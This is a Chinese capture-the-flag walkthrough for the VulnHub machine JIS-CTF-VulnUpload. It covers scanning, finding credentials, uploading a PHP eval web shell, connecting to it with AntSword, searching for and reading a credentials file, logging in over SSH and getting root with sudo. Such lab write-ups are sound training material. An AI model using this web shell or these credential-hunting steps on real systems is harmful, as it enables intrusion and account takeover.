> [JIS-CTF-VulnUpload-CTF01靶机下载地址](https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova)

### 1、网卡配置

开启靶机，看见加载的进度条按`shift`，看到如下界面：

![image-20230828203117026](./imgs/image-20230828203117026.png)

然后按`e`键,修改 如下

```bash
rw signie init=/bin/bash    # rw读写 signie单用户 命令权限/bin/bash
```

![image-20230828202442490](./imgs/image-20230828202442490.png)



改完之后`Ctrl+x`进入单用户模式

先查看我们靶机的网卡名称`ip a`

![image-20230828203322016](./imgs/image-20230828203322016.png)

然后来到靶机`vim /etc/network/interfaces`下，进行网卡配置,

网卡默认配置如下

![image-20230828202823803](./imgs/image-20230828202823803.png)

进行网卡配置修改如下：

![image-20230828203415086](./imgs/image-20230828203415086.png)

然后重启网卡

```bash
/etc/init.d/networking restart
```

重启靶机

### 2、信息收集

靶机MAC：`00:0C:29:09:00:9D`

#### 主机发现

```bash
sudo arp-scan -l
```

![image-20230828203726965](./imgs/image-20230828203726965.png)

#### 端口扫描

```bash
sudo nmap -A -p- 192.168.80.140
```

![image-20230828204026500](./imgs/image-20230828204026500.png)

#### 目录扫描

```bash
sudo dirsearch -u 192.168.80.140  
```

![image-20230828204421711](./imgs/image-20230828204421711.png)

```bash
dirb http://192.168.80.140
```

![image-20230828204802515](./imgs/image-20230828204802515.png)

### 3、漏洞探测

访问flag `http://192.168.80.140/flag/`

![image-20230828204943711](./imgs/image-20230828204943711.png)

访问`robots.txt`

`http://192.168.80.140/robots.txt`

![image-20230828205038544](./imgs/image-20230828205038544.png)

访问`login.php`

`http://192.168.80.140/login.php`

![image-20230828205224719](./imgs/image-20230828205224719.png)

发现没有什么发现，继续 看看其他目录

访问`admin_area`，发现第二个`flag`

![image-20230828205325814](./imgs/image-20230828205325814.png)

> ​	username : `admin`
> ​			password : `3v1l_H@ck3r`
> ​			The 2nd flag is : {7412574125871236547895214}

前往登录页面进行登录

![image-20230828205519547](./imgs/image-20230828205519547.png)

发现是一个文件上传的界面，我们可以上传一句话木马尝试得到	`shell`

### 4、漏洞利用

#### 一句话木马

编辑一句话木马`1.php`

```php
<?php  @eval($_REQUEST[6868])?>
```

在刚才的`robots.txt`文件里，又跟上传相关的

![image-20230828205900277](./imgs/image-20230828205900277.png)

访问`http://192.168.80.140/uploads`报错

访问`http://192.168.80.140/uploaded_files/`页面没反应，但是也没有报错，

继续访问`http://192.168.80.140/uploaded_files/1.php`，页面也没有报错

#### 蚁剑 GetShell

URL地址：`http://192.168.80.140/uploaded_files/1.php`

连接密码：`6868`

![image-20230828210153091](./imgs/image-20230828210153091.png)

查看有用信息

```bash
find / -name 'flag*' 2>/dev/null
```

![image-20230828211756499](./imgs/image-20230828211756499.png)

发现没有权限访问`/var/www/html/flag.txt`



在`/var/www/html/hint.txt`里发现第三个	flag

![image-20230828210507525](./imgs/image-20230828210507525.png)

![image-20230828210528853](./imgs/image-20230828210528853.png)

> 尝试使用`technawi`密码来读取flag.txt文件，你可以在一个隐藏文件找到它

使用`find`命令查找

```bash
find / -user 'technawi' 2>/dev/null
```

![image-20230828211332299](./imgs/image-20230828211332299.png)

`cat /etc/mysql/conf.d/credentials.txt`

![image-20230828211342164](./imgs/image-20230828211342164.png)

得到`technawi`用户的密码

> username : technawi
> 		password : 3vilH@ksor

#### SSH连接

使用ssh连接`ssh technawi@192.168.80.140`，查看该用户能以`root`身份执行哪些文件，发现有所有的权限

![image-20230828211958588](./imgs/image-20230828211958588.png)

然后去看看`/var/www/html/flag.txt`，得到第五个flag

![image-20230828212058326](./imgs/image-20230828212058326.png)

#### 提权

```bash 
sudo su
```

![image-20230828212336617](./imgs/image-20230828212336617.png)